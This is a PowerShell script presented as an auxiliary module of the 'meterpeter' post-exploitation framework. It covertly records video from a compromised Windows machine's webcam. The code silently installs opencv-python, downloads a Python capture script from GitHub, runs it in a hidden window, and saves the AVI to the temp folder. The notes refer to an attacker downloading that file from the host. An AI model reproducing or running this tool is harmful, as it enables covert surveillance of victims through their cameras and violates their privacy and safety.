<#
.SYNOPSIS
   Capture video (AVI) using default webcam

   Author: @r00t-3xp10it
   Credits: @AHLASaad \ @AvinabSaha
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: python3
   Optional Dependencies: opencv-python
   PS cmdlet Dev version: v1.0.6

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.12 that uses opencv-python to record
   a video file (AVI format) using the default camera attached to the computer.

.NOTES
   Remark: recording of webcam turns 'on' the camera ligth.
   Remark: cmdlet will auto-install 'opencv-python' package using pip3 (silent)
   Parameter RecTime accepts values from 8 seconds (minimum) up to 60 seconds (max)
   to prevent the AVI file to be very large if attacker needs to download it from host.
   Remark: Invoke force 'true' to bypass cmdlet internal checks\tests to force execution.

.Parameter RecTime
   The amount of time to rec in seconds (default: 10)

.Parameter FileName
   The video.avi file name (default: meterpeter.avi)

.Parameter WorkingDir
   Cmdlet working directory (default: $Env:TMP)

.Parameter AutoView
   Auto-start AVI after finish? (default: false)

.Parameter Force
   Force cmdlet execution? (default: false)

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -RecTime '15'
   Record webcam live stream for 15 seconds time

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -FileName "capture.avi"
   Record webcam live on capture.avi video file name

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -WorkingDir "$Env:TMP"
   Record webcam live and use %TMP% as working directory

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -AutoView 'true'
   Record webcam live and auto-start AVI file after finish?

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -force 'true'
   Bypass cmdlet internal tests and force execution?

.INPUTS
   None. You cannot pipe objects into Invoke-WebCamAvi.ps1

.OUTPUTS
   * Recording webcam live in avi format.
     + Downloading python script from github.
     + Starting live capture for '10' seconds.
     + Comverting webcam raw data to AVI format.
   * Storage: 'C:\Users\pedro\AppData\Local\Temp\meterpeter.avi'

.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/r00t-3xp10it/redpill/tree/main/lib/WebCam-Capture
   https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$FileName="meterpeter.avi",
   [string]$WorkingDir="$Env:TMP",
   [string]$AutoView="False",
   [string]$Force="false",
   [int]$RecTime='10'
)


$cmdletver = "v1.0.6"
$StartPath = (Get-Location).Path
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
write-host "`n* " -ForegroundColor Green -NoNewline
write-host "Recording webcam live in avi format." -ForegroundColor Green
Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](python3 -V) > pyver.log" -Wait


#Check if Python3 its installed
$pythonTest = Get-Content -Path "pyver.log"
If(-not(Test-Path -Path "pyver.log") -or ($pythonTest -iNotMatch 'True') -or ($pythonTest -eq $null))
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "Module requires python3 installed.`n" -ForegroundColor Red
   return
}

#Make sure opencv-python its installed { bypass tests invoking -force 'true' }
Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](pip3 list|findstr /C:`"opencv-python`") > opencv.log" -Wait
If(-not(Test-Path -Path "opencv.log") -and ($Force -ieq "false"))
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "module failed to create opencv.log`n" -ForegroundColor Red
   return
}

If($Force -ieq "false")
{
   $OPenCVTest = Get-Content -Path "opencv.log" -Raw
   If(-not($OPenCVTest) -or ($OPenCVTest -iNotMatch 'True'))
   {
      write-host "x " -ForegroundColor Red -NoNewline
      write-host "Error: " -ForegroundColor DarkGray -NoNewline
      write-host "Module requires opencv-python installed." -ForegroundColor Red
      Start-Sleep -Seconds 2

      write-host "  => " -ForegroundColor Yellow -NoNewline
      write-host "Installing:'" -ForegroundColor DarkGray -NoNewline
      write-host "pip3 install opencv-python" -ForegroundColor Green -NoNewline
      write-host "'`n" -ForegroundColor DarkGray
      echo y|pip3 install opencv-python --exists-action ignore #Auto-Install dependencies
      write-host ""
   }
}

#Cleanup
Remove-Item -Path "pyver.log" -Force
Remove-Item -Path "opencv.log" -Force

If(Test-Path -Path "$WorkingDir\outpy.avi")
{
   #Delete old avi file
   Remove-Item -Path "$WorkingDir\outpy.avi" -Force
}

If($RecTime -gt 60 -or $RecTime -lt 8)
{
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "NotOptimal: " -ForegroundColor DarkGray -NoNewline
   write-host "record time, defaulting to 10 sec." -ForegroundColor Yellow
   [int]$RecTime = '10'
}


#Download python script from github
write-host "  + " -ForegroundColor DarkYellow -NoNewline
write-host "Downloading python script from github."
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$WorkingDir\WebCam.py"|Unblock-File


#Config python script
$ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py"
$RegInstallPath = Get-ItemProperty -Path 'HKCU:\SOFTWARE\Python\PythonCore\***\InstallPath'|Select-Object -ExpandProperty '(default)'
If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
{
   write-host "  x " -ForegroundColor Red -NoNewline
   write-host "Notfound: " -ForegroundColor DarkGray -NoNewline
   write-host "HKCU:\SOFTWARE\Python\PythonCore\***\InstallPath" -ForegroundColor Red
   Start-Sleep -Seconds 1

   $RegInstallPath = "$Env:LOCALAPPDATA\Programs\python"
   write-host "  + " -ForegroundColor Yellow -NoNewline
   write-host "Use-path: " -ForegroundColor DarkGray -NoNewline
   write-host "$Env:LOCALAPPDATA\Programs\python" -ForegroundColor Green
}

#Get python3 site-packages directory { bypass tests invoking -force 'true' }
$PythonInstallPath = (Get-ChildItem -Path "$RegInstallPath" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
If(-not($PythonInstallPath) -or ($Force -ieq "true"))
{
   $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py"|Select-Object -Skip 2
   echo $ParseRawData > "$WorkingDir\WebCam.py"
}
Else
{
   #replace path in python script
   $ReplaceMe = $PythonInstallPath -replace '\\','\\'
   ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "c:\\\\users\\\\pedro\\\\appdata\\\\local\\\\programs\\\\python\\\\python39\\\\lib\\\\site-packages","$ReplaceMe")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
}


#Rename the output video.avi file
((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "outpy.avi","$FileName")|Set-Content -Path "$WorkingDir\WebCam.py" -Force


cd $WorkingDir
#Start live capture
write-host "  + " -ForegroundColor DarkYellow -NoNewline
write-host "Starting live capture for '" -NoNewline
write-host "$RecTime" -ForegroundColor DarkGreen -NoNewline
write-host "' seconds."
Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"

## Config the capture start
# time counting with 1 sec delay
[int]$RecTime = $RecTime+1

Start-Sleep -Seconds $RecTime
#Stop capture after sellected time
Stop-Process -Name "python3.*" -Force


write-host "  + " -ForegroundColor DarkYellow -NoNewline
write-host "Comverting webcam raw data to AVI format."
Start-Sleep -Seconds 7 #Give some time to allow avi to finish
Remove-Item -Path "$WorkingDir\WebCam.py" -Force
write-host "* " -ForegroundColor Green -NoNewline
write-host "Storage: '" -ForegroundColor DarkGray -NoNewline
write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
write-host "'" -ForegroundColor DarkGray


If($AutoView -ieq "true")
{
   #Auto-Start video file
   write-host "* " -ForegroundColor Green -NoNewline
   write-host "[local]: Auto-Start of AVI video file."
   Start-Process "${WorkingDir}\${FileName}"
}

write-host ""
cd $StartPath
exit
